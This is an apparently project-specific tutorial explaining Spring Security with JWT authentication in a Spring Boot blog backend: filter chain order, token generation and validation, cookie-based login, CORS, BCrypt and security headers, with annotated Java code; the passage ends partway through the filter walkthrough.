# Security Configuration Deep Dive

This document explains HOW Spring Security works, WHAT JWT authentication is, and WHY we configure security this way. We'll cover the complete authentication flow from login to authenticated requests.

---

## Table of Contents

1. [What Is Spring Security?](#what-is-spring-security)
2. [Filter Chain Architecture](#filter-chain-architecture)
3. [JWT Authentication Overview](#jwt-authentication-overview)
4. [Complete Authentication Flow](#complete-authentication-flow)
5. [Line-by-Line: SecurityConfig](#line-by-line-securityconfig)
6. [Line-by-Line: JwtService](#line-by-line-jwtservice)
7. [Line-by-Line: JwtAuthenticationFilter](#line-by-line-jwtauthenticationfilter)
8. [Line-by-Line: CustomUserDetailsService](#line-by-line-customuserdetailsservice)
9. [User Entity as UserDetails](#user-entity-as-userdetails)
10. [BCrypt Password Hashing](#bcrypt-password-hashing)
11. [CORS Configuration](#cors-configuration)
12. [Security Headers](#security-headers)
13. [Stateless Sessions](#stateless-sessions)
14. [Common Security Vulnerabilities Addressed](#common-security-vulnerabilities-addressed)

---

## What Is Spring Security?

**Spring Security** is a framework that provides **authentication** and **authorization** for Spring applications.

### Authentication vs Authorization

**Authentication** - WHO are you?
- Verifying user identity (username + password)
- Proving "I am Alice"

**Authorization** - WHAT can you do?
- Checking permissions (is user allowed to delete this post?)
- Enforcing "Alice can only delete her own posts"

### How Spring Security Works

Spring Security uses a **chain of filters** that intercept HTTP requests BEFORE they reach your controllers.

```
HTTP Request
    ↓
[Filter 1: CORS Filter]
    ↓
[Filter 2: JWT Filter] ← Our custom authentication
    ↓
[Filter 3: Authorization Filter]
    ↓
Controller Method
```

Each filter can:
- **Inspect** the request (check JWT token)
- **Modify** the request (add authentication)
- **Block** the request (return 401/403)
- **Pass** to next filter (call `filterChain.doFilter()`)

---

## Filter Chain Architecture

### What Is a Filter?

A **filter** is a component that intercepts HTTP requests and responses.

```java
public interface Filter {
    void doFilter(HttpServletRequest request,
                  HttpServletResponse response,
                  FilterChain chain) throws IOException, ServletException;
}
```

**How it works:**
1. Request arrives at filter
2. Filter inspects request
3. Filter decides: **block** or **continue**
4. If continue: call `chain.doFilter(request, response)` to pass to next filter
5. Eventually request reaches controller
6. Response travels back through filters in reverse order

### Spring Security Filter Chain

Spring Security adds multiple filters automatically:

```
1. CorsFilter                    ← Handle CORS preflight
2. CsrfFilter                    ← CSRF protection (disabled for JWT)
3. LogoutFilter                  ← Handle logout requests
4. UsernamePasswordAuthenticationFilter  ← Form-based login (we don't use this)
5. JwtAuthenticationFilter       ← OUR CUSTOM FILTER (added manually)
6. AnonymousAuthenticationFilter ← Create anonymous user if no auth
7. ExceptionTranslationFilter    ← Catch security exceptions
8. FilterSecurityInterceptor     ← Check authorization rules
```

**Our custom filter:**
```java
.addFilterBefore(jwtAuthenticationFilter, UsernamePasswordAuthenticationFilter.class)
```

This means: "Run JWT filter BEFORE the default username/password filter"

### Order Matters!

Filters run in **sequence**. Order is critical:

**Correct order:**
```
CORS Filter → JWT Filter → Controller
```
If CORS runs first, browser preflight requests work.

**Wrong order:**
```
JWT Filter → CORS Filter → Controller
```
Browser preflight requests fail (no JWT in preflight).

---

## JWT Authentication Overview

### What Is JWT?

**JWT (JSON Web Token)** is a compact, URL-safe token format for transmitting information.

**Structure:**
```
header.payload.signature
```

**Example JWT:**
```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJqb2huZG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**Three parts (Base64 encoded):**

1. **Header** (algorithm and token type)
   ```json
   {
     "alg": "HS256",
     "typ": "JWT"
   }
   ```

2. **Payload** (claims - data about user)
   ```json
   {
     "sub": "johndoe",           // subject (username)
     "iat": 1516239022,          // issued at (timestamp)
     "exp": 1516325422           // expiration (timestamp)
   }
   ```

3. **Signature** (cryptographic hash)
   ```
   HMACSHA256(
     base64UrlEncode(header) + "." + base64UrlEncode(payload),
     secret
   )
   ```

### Why JWT?

**Stateless authentication:**
- Server doesn't store session data
- All user info is in the token
- Scalable (no session database)

**Self-contained:**
- Token contains user identity and roles
- No database lookup needed to verify

**Secure:**
- Signature prevents tampering
- If someone changes payload, signature becomes invalid

### How JWT Signature Works

**Token generation:**
```
1. Create payload: {"sub": "alice", "exp": 1234567890}
2. Encode header and payload as Base64
3. Sign with secret key: HMAC-SHA256(header + payload, secret)
4. Combine: header.payload.signature
```

**Token validation:**
```
1. Split token into parts: header, payload, signature
2. Recreate signature: HMAC-SHA256(header + payload, secret)
3. Compare signatures
4. If match → token is valid
5. If different → token was tampered with
```

**Security property:**
- Without the secret key, you CANNOT create a valid signature
- Changing payload invalidates signature
- Server can trust token contents

---

## Complete Authentication Flow

Let's trace the COMPLETE flow from login to authenticated API call.

### Flow 1: User Login

```
1. User submits login form
   POST /auth/login
   Body: {"username": "alice", "password": "password123"}

2. Request hits AuthController.login()

3. Controller calls authenticationManager.authenticate()

4. AuthenticationManager calls DaoAuthenticationProvider

5. DaoAuthenticationProvider:
   a. Calls userDetailsService.loadUserByUsername("alice")
   b. Gets User entity from database (with hashed password)
   c. Compares passwords with BCrypt
   d. If match: creates Authentication object
   e. If no match: throws BadCredentialsException

6. If authentication succeeds:
   a. Controller calls jwtService.generateToken(user)
   b. JwtService creates JWT with user's username
   c. Signs JWT with secret key
   d. Returns token: "eyJhbGci..."

7. Controller creates secure cookie with JWT

8. Returns response with cookie:
   Set-Cookie: jwt=eyJhbGci...; HttpOnly; Secure; SameSite=Strict

9. Browser stores cookie automatically

10. Browser sends cookie on future requests
```

### Flow 2: Authenticated Request

```
1. User makes API call
   GET /posts/feed
   Cookie: jwt=eyJhbGci...

2. Request enters filter chain

3. JwtAuthenticationFilter intercepts:

4. Filter extracts JWT from cookie:
   jwt = request.getCookies()["jwt"]

5. Filter extracts username from JWT:
   username = jwtService.extractUsername(jwt)
   // Decodes payload: {"sub": "alice"} → "alice"

6. Filter verifies signature:
   jwtService.isTokenValid(jwt, userDetails)
   // Recalculates signature and compares

7. If valid, filter loads user:
   userDetails = userDetailsService.loadUserByUsername("alice")
   // Queries database for User entity

8. Filter creates Authentication object:
   auth = new UsernamePasswordAuthenticationToken(
       userDetails,          // principal
       null,                 // credentials (no password needed)
       userDetails.getAuthorities()  // roles: ["ROLE_USER"]
   )

9. Filter stores in SecurityContext:
   SecurityContextHolder.getContext().setAuthentication(auth)

10. Filter passes request to next filter:
    filterChain.doFilter(request, response)

11. Request reaches PostController.getFeed()

12. Spring injects Authentication parameter:
    public ResponseEntity<List<PostResponse>> getFeed(Authentication auth) {
        // auth is already populated!
        String username = auth.getName();  // "alice"
    }

13. Controller processes request and returns response
```

### Flow 3: Logout

```
1. User clicks logout
   POST /auth/logout

2. Controller creates cookie with maxAge=0:
   ResponseCookie cookie = ResponseCookie.from("jwt", "")
       .maxAge(0)  // ← Expire immediately
       .build();

3. Controller clears SecurityContext:
   SecurityContextHolder.clearContext();

4. Browser receives Set-Cookie header and deletes cookie

5. Future requests have no JWT cookie

6. JwtAuthenticationFilter finds no token

7. Request continues without authentication

8. If endpoint requires authentication → 401 Unauthorized
```

---

## Line-by-Line: SecurityConfig

**File:** `backend/src/main/java/_blog/blog/config/SecurityConfig.java`

### Lines 1-26: Imports and Package

```java
package _blog.blog.config;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.authentication.AuthenticationProvider;
import org.springframework.security.authentication.dao.DaoAuthenticationProvider;
import org.springframework.security.config.annotation.authentication.configuration.AuthenticationConfiguration;
import org.springframework.security.config.annotation.method.configuration.EnableMethodSecurity;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.http.SessionCreationPolicy;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.security.web.SecurityFilterChain;
import org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter;
```

**Key imports:**

- `SecurityFilterChain` - Configures the filter chain
- `AuthenticationManager` - Central interface for authentication
- `DaoAuthenticationProvider` - Authentication provider that uses database
- `BCryptPasswordEncoder` - Password hashing algorithm
- `UserDetailsService` - Interface for loading user data

### Lines 27-30: Class Declaration

```java
@Configuration
@EnableWebSecurity
@EnableMethodSecurity
public class SecurityConfig {
```

**@Configuration:**
- Tells Spring this class contains bean definitions
- Spring processes this at startup

**@EnableWebSecurity:**
- Enables Spring Security
- Activates security filter chain
- Without this, Spring Security doesn't run

**@EnableMethodSecurity:**
- Enables method-level security annotations
- Allows `@PreAuthorize("hasRole('ADMIN')")` on controller methods
- Processes security checks before method execution

### Lines 32-39: Dependency Injection

```java
private final UserDetailsService userDetailsService;
private final JwtAuthenticationFilter jwtAuthenticationFilter;

public SecurityConfig(UserDetailsService userDetailsService,
                     JwtAuthenticationFilter jwtAuthenticationFilter) {
    this.userDetailsService = userDetailsService;
    this.jwtAuthenticationFilter = jwtAuthenticationFilter;
}
```

**UserDetailsService:**
- Interface for loading user by username
- We have CustomUserDetailsService implementing this
- Spring auto-injects our implementation

**JwtAuthenticationFilter:**
- Our custom filter for JWT authentication
- Created as `@Component`, so Spring manages it
- We'll add it to the filter chain

### Lines 41-80: SecurityFilterChain Bean

```java
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    return http
        .csrf(csrf -> csrf.disable())
        .cors(cors -> cors.configurationSource(corsConfigurationSource()))
        // ... more config ...
        .build();
}
```

**@Bean:**
- Creates a Spring-managed bean
- Spring calls this method at startup
- Returns value is stored in ApplicationContext

**HttpSecurity:**
- Builder for configuring web security
- Fluent API with method chaining
- Each method returns `this` for chaining

#### CSRF Configuration (Line 47)

```java
.csrf(csrf -> csrf.disable())
```

**What is CSRF?**
- **Cross-Site Request Forgery** - attack where malicious site makes requests on user's behalf
- Example: Evil site sends `POST /transfer?to=attacker&amount=1000` with your cookies

**Why disabled for JWT?**
- CSRF targets **cookie-based** authentication
- Attack relies on browser automatically sending cookies
- JWT in **Authorization header** is NOT sent automatically
- Malicious site can't access JWT (same-origin policy)

**Important:**
- If you use JWT in **cookies** (we do!), you NEED CSRF protection OR SameSite cookies
- We use **SameSite=Strict** cookies, which prevent CSRF
- `SameSite=Strict` means: "only send cookie to same site"

#### CORS Configuration (Line 48)

```java
.cors(cors -> cors.configurationSource(corsConfigurationSource()))
```

**What is CORS?**
- **Cross-Origin Resource Sharing** - mechanism to allow/block cross-origin requests
- Browser security feature
- Example: Frontend on `localhost:4200` calling API on `localhost:8080`

**Why needed?**
- Browser blocks cross-origin requests by default
- Our frontend (Angular on :4200) needs to call backend (:8080)
- CORS headers tell browser: "This origin is allowed"

**How it works:**
1. Browser sees cross-origin request
2. Browser sends **preflight** request: `OPTIONS /api/posts`
3. Server responds with CORS headers: `Access-Control-Allow-Origin: http://localhost:4200`
4. If allowed, browser sends actual request

#### Authorization Rules (Lines 49-60)

```java
.authorizeHttpRequests(authz -> authz
    .requestMatchers("/auth/**").permitAll()
    .requestMatchers("/api/v1/auth/**").permitAll()
    .requestMatchers("/actuator/health").permitAll()
    .requestMatchers(HttpMethod.POST, "/uploads/upload").authenticated()
    .requestMatchers(HttpMethod.POST, "/uploads/image").authenticated()
    .requestMatchers(HttpMethod.POST, "/uploads/avatar").authenticated()
    .requestMatchers(HttpMethod.POST, "/uploads/video").authenticated()
    .requestMatchers(HttpMethod.GET, "/uploads/**").permitAll()
    .requestMatchers(HttpMethod.HEAD, "/uploads/**").permitAll()
    .anyRequest().authenticated()
)
```

**requestMatchers:**
- Matches URL patterns
- Order matters - first match wins

**permitAll():**
- No authentication required
- Anyone can access

**authenticated():**
- Must be logged in
- JWT required

**URL patterns explained:**

1. `/auth/**` - Public (login, register, logout)
2. `/actuator/health` - Health check for monitoring
3. `POST /uploads/*` - Upload requires authentication (prevent spam)
4. `GET /uploads/**` - Viewing uploads is public
5. `.anyRequest().authenticated()` - Everything else requires login

**Why HEAD requests for uploads?**
- Browsers send HEAD to check if file exists
- HEAD is like GET but returns only headers, no body
- Used for file validation

#### Session Management (Lines 61-63)

```java
.sessionManagement(session -> session
    .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
)
```

**What are sessions?**
- Traditional approach: server stores user session in memory/database
- Session ID stored in cookie
- Server looks up session on each request

**STATELESS:**
- **No server-side sessions**
- All state in JWT token
- Server doesn't remember logged-in users
- Each request is independent

**Benefits of stateless:**
- **Scalability** - no session storage needed
- **Horizontal scaling** - any server can handle any request
- **No session synchronization** across servers

**Trade-off:**
- Can't invalidate JWT before expiration
- Logout only clears client-side cookie
- If JWT is stolen, it's valid until expiration

#### Security Headers (Lines 64-76)

```java
.headers(headers -> headers
    .frameOptions(frame -> frame.deny())
    .xssProtection(xss -> xss.disable())
    .contentTypeOptions(contentType -> contentType.disable())
    .httpStrictTransportSecurity(hsts -> hsts
        .includeSubDomains(true)
        .maxAgeInSeconds(31536000)
    )
    .contentSecurityPolicy(csp -> csp
        .policyDirectives("default-src 'self'; ...")
    )
)
```

**Security headers explained:**

1. **Frame Options: DENY**
   - Prevents page from being embedded in `<iframe>`
   - **Prevents:** Clickjacking attacks
   - Response header: `X-Frame-Options: DENY`

2. **XSS Protection: Disabled**
   - Old header for XSS filtering
   - Modern browsers use CSP instead
   - Disabled to avoid conflicts

3. **HSTS (HTTP Strict Transport Security)**
   - Forces HTTPS for 1 year
   - Prevents downgrade attacks
   - `includeSubDomains`: applies to all subdomains
   - Response header: `Strict-Transport-Security: max-age=31536000; includeSubDomains`

4. **Content Security Policy (CSP)**
   - Controls what resources browser can load
   - `default-src 'self'` - only load from same origin
   - `script-src 'self'` - only execute scripts from same origin
   - `style-src 'self' 'unsafe-inline'` - styles from same origin + inline styles
   - **Prevents:** XSS, malicious script injection

#### Authentication Provider (Line 77)

```java
.authenticationProvider(authenticationProvider())
```

**What is AuthenticationProvider?**
- Strategy for authenticating credentials
- We use `DaoAuthenticationProvider` (database-backed)
- Loads user from UserDetailsService
- Compares passwords with BCrypt

**Alternative providers:**
- LDAP provider (Active Directory)
- OAuth2 provider (Google, Facebook)
- In-memory provider (testing)

#### Add JWT Filter (Line 78)

```java
.addFilterBefore(jwtAuthenticationFilter, UsernamePasswordAuthenticationFilter.class)
```

**addFilterBefore:**
- Adds custom filter to chain
- **Before** UsernamePasswordAuthenticationFilter
- Means JWT filter runs first

**Why before UsernamePasswordAuthenticationFilter?**
- We're replacing form-based login with JWT
- JWT filter should handle authentication
- UsernamePasswordAuthenticationFilter never triggers (we use JWT, not forms)

**Filter order after this:**
```
1. CorsFilter
2. JwtAuthenticationFilter  ← OUR FILTER
3. UsernamePasswordAuthenticationFilter
4. ... other filters ...
```

### Lines 82-102: CORS Configuration

```java
@Bean
public CorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration configuration = new CorsConfiguration();
    configuration.setAllowedOrigins(Arrays.asList("http://localhost:4200"));
    configuration.setAllowedMethods(Arrays.asList("GET", "POST", "PUT", "DELETE", "OPTIONS"));
    configuration.setAllowedHeaders(Arrays.asList(
        "Content-Type",
        "Authorization",
        "X-Requested-With",
        "Accept",
        "Origin"
    ));
    configuration.setAllowCredentials(true);
    configuration.setMaxAge(3600L);

    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/**", configuration);
    return source;
}
```

**setAllowedOrigins:**
- Only `http://localhost:4200` can call API
- In production: change to frontend domain

**setAllowedMethods:**
- Which HTTP methods are allowed
- OPTIONS is for preflight requests

**setAllowedHeaders:**
- Which headers frontend can send
- **Explicit list** instead of `*` wildcard
- **Why?** Using `*` with credentials is insecure

**setAllowCredentials(true):**
- Allows sending cookies
- Necessary for JWT in cookies
- Browser includes cookies in CORS requests

**setMaxAge(3600L):**
- Browser caches preflight response for 1 hour
- Reduces preflight requests
- Improves performance

**registerCorsConfiguration("/**"):**
- Apply CORS config to all endpoints
- Alternative: different CORS rules for different paths

### Lines 104-107: Password Encoder

```java
@Bean
public PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder();
}
```

**Why BCrypt?**
- **Adaptive** - can increase cost as computers get faster
- **Salted** - adds random data to prevent rainbow table attacks
- **Slow** - intentionally slow to prevent brute force
- **Industry standard** - widely trusted

**How it works:**
```java
String plaintext = "password123";
String hashed = passwordEncoder.encode(plaintext);
// $2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy

boolean matches = passwordEncoder.matches("password123", hashed);
// true
```

**Stored in database:**
- Never store plaintext passwords
- Store BCrypt hash
- Irreversible - can't get plaintext back

### Lines 109-114: Authentication Provider

```java
@Bean
public AuthenticationProvider authenticationProvider() {
    DaoAuthenticationProvider authProvider = new DaoAuthenticationProvider(userDetailsService);
    authProvider.setPasswordEncoder(passwordEncoder());
    return authProvider;
}
```

**DaoAuthenticationProvider:**
- "DAO" = Data Access Object
- Authenticates using UserDetailsService + PasswordEncoder

**How it works:**
1. User submits credentials: `{username: "alice", password: "pass123"}`
2. `authProvider.authenticate()` is called
3. Calls `userDetailsService.loadUserByUsername("alice")`
4. Gets User entity with hashed password from database
5. Calls `passwordEncoder.matches("pass123", user.getPassword())`
6. If match → authentication succeeds
7. If no match → throws `BadCredentialsException`

**Why constructor injection here?**
```java
new DaoAuthenticationProvider(userDetailsService)
```
Instead of:
```java
DaoAuthenticationProvider authProvider = new DaoAuthenticationProvider();
authProvider.setUserDetailsService(userDetailsService);
```

Newer API - more concise.

### Lines 116-119: Authentication Manager

```java
@Bean
public AuthenticationManager authenticationManager(AuthenticationConfiguration config) throws Exception {
    return config.getAuthenticationManager();
}
```

**What is AuthenticationManager?**
- **Central interface** for authentication
- Has one method: `Authentication authenticate(Authentication auth)`
- Controllers call this to authenticate users

**How it uses AuthenticationProvider:**
```java
// Controller calls:
authenticationManager.authenticate(new UsernamePasswordAuthenticationToken(username, password))

// AuthenticationManager delegates to:
authenticationProvider.authenticate(...)  // Our DaoAuthenticationProvider

// Which calls:
userDetailsService.loadUserByUsername(username)  // CustomUserDetailsService

// And:
passwordEncoder.matches(password, user.getPassword())  // BCrypt
```

**Why get from AuthenticationConfiguration?**
- Spring Security auto-configures it
- Wires up providers, user details service, etc.
- We just expose it as bean for injection

---

## Line-by-Line: JwtService

**File:** `backend/src/main/java/_blog/blog/service/JwtService.java`

### Lines 1-18: Imports

```java
package _blog.blog.service;

import java.security.Key;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import java.util.function.Function;

import org.springframework.beans.factory.annotation.Value;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.stereotype.Service;
import jakarta.annotation.PostConstruct;

import io.jsonwebtoken.Claims;
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.io.Decoders;
import io.jsonwebtoken.security.Keys;
```

**Key imports:**

- `io.jsonwebtoken.*` - JJWT library for creating/parsing JWT
- `java.security.Key` - Cryptographic key for signing
- `Claims` - JWT payload (username, expiration, etc.)
- `@PostConstruct` - Method to run after bean construction

### Lines 19-27: Class Declaration and Fields

```java
@Service
public class JwtService {

    @Value("${security.jwt.secret-key}")
    private String secretKey;

    @Value("${security.jwt.expiration-time}")
    private long jwtExpiration;
}
```

**@Value injection:**
- Reads from `application.properties` or environment variables
- `${security.jwt.secret-key}` → value from config
- Example config:
  ```properties
  security.jwt.secret-key=your-secret-key-here
  security.jwt.expiration-time=86400000
  ```

**secretKey:**
- Used to sign JWT
- **MUST** be kept secret
- If leaked, attacker can forge tokens

**jwtExpiration:**
- Token lifetime in milliseconds
- 86400000 ms = 24 hours
- After expiration, token is invalid

### Lines 28-61: Validate Secret Key on Startup

```java
@PostConstruct
public void validateSecretKey() {
    if (secretKey == null || secretKey.trim().isEmpty()) {
        throw new IllegalStateException(
            "CRITICAL SECURITY ERROR: JWT_SECRET_KEY must be set!"
        );
    }

    try {
        byte[] keyBytes = Decoders.BASE64.decode(secretKey);
        if (keyBytes.length < 32) {  // 256 bits minimum
            throw new IllegalStateException(
                "CRITICAL SECURITY ERROR: Key must be at least 256 bits"
            );
        }
    } catch (IllegalArgumentException e) {
        throw new IllegalStateException(
            "CRITICAL SECURITY ERROR: Key must be valid Base64"
        );
    }

    System.out.println("✅ JWT secret key validated");
}
```

**@PostConstruct:**
- Runs **after** Spring creates the bean
- Runs **before** application starts serving requests
- Perfect for validation

**Why validate secret key?**
- Catches configuration errors at startup
- Fails fast instead of runtime errors
- Prevents weak secrets

**Minimum 256 bits (32 bytes):**
- HMAC-SHA256 requires 256-bit key
- Shorter keys are insecure
- Can be brute-forced

**Base64 encoding:**
- Secret key is stored as Base64 string
- Converted to bytes for cryptography
- Example: `"c2VjcmV0a2V5MTIzNDU2Nzg="` → byte array

### Lines 63-65: Extract Username

```java
public String extractUsername(String token) {
    return extractClaim(token, Claims::getSubject);
}
```

**What is "subject"?**
- JWT standard claim for user identity
- In our tokens: subject = username
- Stored in payload: `{"sub": "alice"}`

**How it works:**
1. Parse JWT and extract payload
2. Get `sub` field from payload
3. Return username

### Lines 67-70: Extract Claim (Generic)

```java
public <T> T extractClaim(String token, Function<Claims, T> claimsResolver) {
    final Claims claims = extractAllClaims(token);
    return claimsResolver.apply(claims);
}
```

**Generic method for extracting any claim:**
- Claims is a Map-like object
- `claimsResolver` is a function to extract specific claim
- Example usage:
  ```java
  String username = extractClaim(token, Claims::getSubject);
  Date expiration = extractClaim(token, Claims::getExpiration);
  ```

**Function<Claims, T>:**
- Functional interface (Java 8+)
- Takes Claims, returns T
- `Claims::getSubject` is method reference
- Equivalent to: `claims -> claims.getSubject()`

### Lines 72-78: Generate Token

```java
public String generateToken(UserDetails userDetails) {
    return generateToken(new HashMap<>(), userDetails);
}

public String generateToken(Map<String, Object> extraClaims, UserDetails userDetails) {
    return buildToken(extraClaims, userDetails, jwtExpiration);
}
```

**Overloaded methods:**
1. Simple version: just user details
2. Advanced version: extra claims + user details

**Extra claims:**
- Additional data in JWT payload
- Example: `{"role": "ADMIN", "email": "alice@example.com"}`
- Usually not needed - username is enough

### Lines 80-90: Build Token

```java
private String buildToken(Map<String, Object> extraClaims, UserDetails userDetails, long expiration) {
    long currentTimeMillis = System.currentTimeMillis();
    return Jwts
        .builder()
        .claims(extraClaims)
        .subject(userDetails.getUsername())
        .issuedAt(new Date(currentTimeMillis))
        .expiration(new Date(currentTimeMillis + expiration))
        .signWith(getSignInKey())
        .compact();
}
```

**JWT builder fluent API:**

1. **claims(extraClaims)** - Add custom claims
2. **subject(username)** - Set `sub` field
3. **issuedAt(now)** - Set `iat` (issued at) timestamp
4. **expiration(now + 24h)** - Set `exp` (expiration) timestamp
5. **signWith(key)** - Sign with HMAC-SHA256
6. **compact()** - Encode as string

**Generated token structure:**
```json
{
  "sub": "alice",
  "iat": 1699564800,
  "exp": 1699651200
}
```

**After signing:**
```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhbGljZSIsImlhdCI6MTY5OTU2NDgwMCwiZXhwIjoxNjk5NjUxMjAwfQ.signature_here
```

### Lines 92-95: Validate Token

```java
public boolean isTokenValid(String token, UserDetails userDetails) {
    final String username = extractUsername(token);
    return (username.equals(userDetails.getUsername())) && !isTokenExpired(token);
}
```

**Two checks:**

1. **Username matches:**
   - Token says "alice"
   - UserDetails says "alice"
   - Prevents token reuse for different user

2. **Not expired:**
   - Current time < expiration time
   - Prevents use of old tokens

**Why check username?**
- Token might be valid but for different user
- Example: Old token for user who changed username

### Lines 97-103: Check Expiration

```java
private boolean isTokenExpired(String token) {
    return extractExpiration(token).before(new Date());
}

private Date extractExpiration(String token) {
    return extractClaim(token, Claims::getExpiration);
}
```

**extractExpiration:**
- Gets `exp` claim from token
- Returns Date object

**isTokenExpired:**
- Compares expiration with current time
- `expirationDate.before(now)` → expired
- `expirationDate.after(now)` → still valid

### Lines 105-112: Extract All Claims

```java
private Claims extractAllClaims(String token) {
    return Jwts
        .parser()
        .verifyWith((javax.crypto.SecretKey) getSignInKey())
        .build()
        .parseSignedClaims(token)
        .getPayload();
}
```

**JWT parsing process:**

1. **parser()** - Create JWT parser
2. **verifyWith(key)** - Set verification key
3. **build()** - Build parser
4. **parseSignedClaims(token)** - Parse and verify signature
5. **getPayload()** - Get claims

**Signature verification:**
- Parser recreates signature: `HMAC(header + payload, secretKey)`
- Compares with token's signature
- If match → token is authentic
- If different → token was tampered with, throws exception

### Lines 114-117: Get Signing Key

```java
private Key getSignInKey() {
    byte[] keyBytes = Decoders.BASE64.decode(secretKey);
    return Keys.hmacShaKeyFor(keyBytes);
}
```

**Convert secret to cryptographic key:**

1. **Decode Base64** - String → byte array
2. **Create HMAC key** - Use for signing/verification

**Why HMAC?**
- **H**ash-based **M**essage **A**uthentication **C**ode
- Symmetric algorithm (same key for sign and verify)
- Fast and secure
- Alternative: RSA (asymmetric, slower)

---

## Line-by-Line: JwtAuthenticationFilter

**File:** `backend/src/main/java/_blog/blog/filter/JwtAuthenticationFilter.java`

### Lines 1-19: Imports

```java
package _blog.blog.filter;

import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.web.authentication.WebAuthenticationDetailsSource;
import org.springframework.stereotype.Component;
import org.springframework.web.filter.OncePerRequestFilter;

import _blog.blog.service.JwtService;
import jakarta.servlet.FilterChain;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
```

**Key imports:**

- `OncePerRequestFilter` - Base class for filters that execute once per request
- `SecurityContextHolder` - Thread-local storage for authentication
- `UserDetailsService` - Load user by username
- `JwtService` - Parse and validate JWT

### Lines 20-29: Class Declaration

```java
@Component
public class JwtAuthenticationFilter extends OncePerRequestFilter {

    private final JwtService jwtService;
    private final UserDetailsService userDetailsService;

    public JwtAuthenticationFilter(JwtService jwtService, UserDetailsService userDetailsService) {
        this.jwtService = jwtService;
        this.userDetailsService = userDetailsService;
    }
}
```

**@Component:**
- Creates Spring bean
- Spring manages lifecycle
- Can be injected elsewhere

**OncePerRequestFilter:**
- Guarantees filter executes **once** per request
- Even with forwards/redirects
- Provides `doFilterInternal()` method

**Why OncePerRequestFilter?**
- Prevents double-processing
- Ensures authentication happens exactly once
- Better than raw `Filter` interface

### Lines 31-47: Filter Method and Public Endpoint Skip

```java
@Override
protected void doFilterInternal(
    @NonNull HttpServletRequest request,
    @NonNull HttpServletResponse response,
    @NonNull FilterChain filterChain
) throws ServletException, IOException {

    // Skip JWT authentication for public endpoints
    String path = request.getServletPath();
    String method = request.getMethod();

    if (path.contains("/auth") ||
        path.contains("/actuator/health") ||
        (path.startsWith("/uploads") && ("GET".equals(method) || "HEAD".equals(method)))) {
        filterChain.doFilter(request, response);
        return;
    }
```

**doFilterInternal parameters:**

- `HttpServletRequest request` - Incoming HTTP request
- `HttpServletResponse response` - Outgoing HTTP response
- `FilterChain filterChain` - Chain of remaining filters

**Early exit for public endpoints:**
- `/auth/*` - Login, register (no JWT needed)
- `/actuator/health` - Health check
- `GET/HEAD /uploads/*` - View files (public)

**filterChain.doFilter(request, response):**
- Passes request to next filter
- **Exits method** with `return`
- Skips JWT logic

**Why skip?**
- Performance - don't parse JWT if not needed
- Allows public access - login without token

### Lines 49-74: Extract JWT from Cookie

```java
// Read JWT from cookie instead of Authorization header
String jwt = null;

// Try to get JWT from cookie first
if (request.getCookies() != null) {
    for (jakarta.servlet.http.Cookie cookie : request.getCookies()) {
        if ("jwt".equals(cookie.getName())) {
            jwt = cookie.getValue();
            break;
        }
    }
}

// Fallback: try Authorization header
if (jwt == null) {
    final String authHeader = request.getHeader("Authorization");
    if (authHeader != null && authHeader.startsWith("Bearer ")) {
        jwt = authHeader.substring(7);
    }
}

// If no JWT found, continue without authentication
if (jwt == null) {
    filterChain.doFilter(request, response);
    return;
}
```

**Cookie extraction:**
- Loop through all cookies
- Find cookie named "jwt"
- Get its value
- **Why loop?** Cookies is an array, no `getCookie(name)` method

**Fallback to Authorization header:**
- For backward compatibility
- Or for non-browser clients
- Format: `Authorization: Bearer eyJhbGci...`
- Extract token: skip first 7 characters ("Bearer ")

**No token found:**
- Not authenticated
- Continue to next filter
- If endpoint requires auth, later filter will block

### Lines 76-93: Validate and Authenticate

```java
final String userEmail = jwtService.extractUsername(jwt);

if (userEmail != null && SecurityContextHolder.getContext().getAuthentication() == null) {
    UserDetails userDetails = this.userDetailsService.loadUserByUsername(userEmail);

    if (jwtService.isTokenValid(jwt, userDetails) && userDetails.isEnabled()) {
        UsernamePasswordAuthenticationToken authToken = new UsernamePasswordAuthenticationToken(
            userDetails,
            null,
            userDetails.getAuthorities()
        );
        authToken.setDetails(
            new WebAuthenticationDetailsSource().buildDetails(request)
        );
        SecurityContextHolder.getContext().setAuthentication(authToken);
    }
}
filterChain.doFilter(request, response);
```

**Extract username:**
```java
final String userEmail = jwtService.extractUsername(jwt);
```
- Parses JWT payload
- Gets `sub` claim
- Returns username

**Two conditions before authenticating:**

1. **userEmail != null** - Token has username
2. **SecurityContextHolder.getContext().getAuthentication() == null** - Not already authenticated

**Why check if already authenticated?**
- Filter might run multiple times (forwards, includes)
- Avoid redundant database queries
- Performance optimization

**Load user from database:**
```java
UserDetails userDetails = userDetailsService.loadUserByUsername(userEmail);
```
- Calls CustomUserDetailsService
- Queries database for User entity
- Returns User (which implements UserDetails)

**Validate token:**
```java
if (jwtService.isTokenValid(jwt, userDetails) && userDetails.isEnabled())
```

**Two checks:**
1. **Token is valid** - signature correct, not expired, username matches
